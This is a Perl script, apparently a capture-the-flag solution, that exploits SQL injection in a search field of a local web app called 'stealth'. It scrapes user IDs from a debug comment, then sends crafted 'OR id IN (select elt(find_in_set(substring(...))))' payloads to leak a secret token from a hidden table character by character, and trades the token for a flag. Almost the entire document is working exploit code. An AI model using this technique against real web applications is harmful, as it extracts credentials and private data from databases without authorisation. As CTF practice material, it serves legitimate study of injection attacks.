#!/usr/bin/env perl
use strict;
use warnings;

use Data::Dumper;
use List::MoreUtils qw(firstidx);
use LWP::Simple;
use JSON;

my $ua = LWP::UserAgent->new;
my $base = 'http://127.0.0.1/stealth/';
my $alpha = 'abcdef0123456789';
my $max_read = 5;
my $read_len = 40;

my $column = 'token';
my $table = 'tf528764d624db12';
#my $table = 't3683e20446a6b40';

sub get_response
{
	my $url = shift;
	my $method = shift;
	my $data = shift || '';
	my $res = '';

	if ($method eq 'POST') {
		$res = $ua->post($base . $url, $data);
	} else {
		$res = $ua->get($base . $url);
	}

	return $res->content;
}

sub get_dump
{
	my $content = get_response '', 'POST', [
		'site' => 'panel'
	];

	$content =~ /DEBUG PURPOSE (.*) -->/ or die 'regex mismatch';

	return decode_json $1;
}

sub inject
{
	my $inj = shift;
	my $content = get_response '', 'POST', [
		'site' => 'default',
		'action' => 'search',
		'name' => $inj
	];

	return $content;
}

sub get_flag
{
	my $content = get_response '', 'POST', [
		'site' => 'panel',
		'action' => 'login2',
		'authtoken' => shift
	];

	$content =~ /(flag{.*})/ or die 'no flag :(';

	return $1;
}

sub grep2d (&;@) {
        my $test = shift;
        grep { grep $test->(), @$_ } @_
}

my $alpha_list = join(',', split //, $alpha);

my @students = @{ get_dump() };
my @ids = ();

foreach my $student (@students) {
	push @ids, $student->{'id'};
}

# check if user amount is sufficient enough
if (($max_read * length($alpha)) > scalar @ids) {
	die 'not enough users';
}

my @values = (0,1,2,3,4,5,6,8,9,10,11);
my $values_list = join ',', @values;
my @mapping = @ids[0..10];

my $inj = ' OR id=(select elt((select find_in_set((select tries from ' . $table . '), 0x' . unpack("H*", $values_list) . ')),'. join(',',@mapping) .')) #\\';

my $tries = inject $inj;
$tries =~ /<td>(\d+)<\/td>/ or die "failed to get try count";

my $found = $1;
my $idx = (firstidx { $_ eq $found } @ids) % length($alpha);

# do some dummy requests to get a fresh token
foreach (0..(11-$values[$idx])) {
	get_response '', 'GET', '';
}

# create position character mapping
my @positions = ();
foreach my $i (0..$max_read-1) {
	push @positions, [ @ids[($i*(length($alpha)))..(($i*length($alpha))+(length($alpha)-1))] ];
}

my $token = '';
my @id_set = ();
foreach my $i (0..($read_len/$max_read-1)) {
	@id_set = ();
	foreach my $k (0..$max_read-1) {
		push @id_set, '(select elt('.
				'(select find_in_set('.
					'(select substring(' . $column . ', '. (($i*$max_read)+($k+1)) .', 1) from ' . $table . '),'.
					'0x' . unpack("H*", $alpha_list) . ')),'.
				join(',', @{ $positions[$k] }) . '))';
	}

	$inj = ' OR id IN (' . join(',', @id_set) . ') #\\';

	my $content = inject $inj;

	while ($content =~ /<td>(\d+)<\/td>/g) {
		$found = $1;
		$idx = (firstidx { $_ eq $found } @ids) % length($alpha);

		$token .= substr($alpha, $idx, 1);
	}
}

my $flag = get_flag $token;

print "Flag: ", $flag, $/;
